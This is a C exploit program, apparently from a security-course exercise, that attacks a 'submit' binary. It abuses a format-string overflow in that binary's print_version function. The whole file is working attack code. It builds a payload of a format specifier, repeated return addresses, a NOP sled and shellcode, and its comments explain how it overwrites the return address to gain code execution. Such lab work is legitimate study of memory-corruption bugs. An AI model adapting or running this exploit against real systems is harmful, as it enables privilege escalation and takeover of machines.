/*
 * sploit2.c
 * this program uses format string to attack the submit program
 * the vulnerability is in print_version function where it uses insecure function sprintf to copy string from one buffer to another
 * we can use that to overwrite the return address
 */

#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "shellcode.h"

#define DEFAULT_WEAPON_SIZE            128
#define NOP                            0x90
#define TARGET "/usr/local/bin/submit"

// waepon string structure "%76d\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff<nops><shellcode>"

int main(int argc, char *argv[]) {

  char weapon[DEFAULT_WEAPON_SIZE];

  int i;
  // the first \xff is to offset 1 byte so that the address are 4 bytes aligned
  // the address is loaded in reverse order, so I reversed my address to be \x98\xdf\xbf\xff
  // made several copies just incase the stack starts from another address. 
  char* start = "%76d\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff\x98\xdf\xbf\xff";
  char *ptr;
  char *env[1];

  // fill the weapon with nops
  for (i = 0; i < DEFAULT_WEAPON_SIZE; i+=1) {
     weapon[i] = NOP;
  }

  // fill the weapon with buffer address
  for (i = 0; i < strlen(start); i+=1) {
     weapon[i] = start[i];
  }
  
  // copy the shell code to the back
  ptr = weapon + (DEFAULT_WEAPON_SIZE - (strlen(shellcode)));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  // code calling submit
  argv[0] = weapon; argv[1] = "-v"; 
  argv[2] = NULL; argv[3] = NULL;

  env[0] = NULL;
  if (execve(TARGET, argv, env) < 0)
    fprintf(stderr, "execve failed.\n");
  return 0;
}
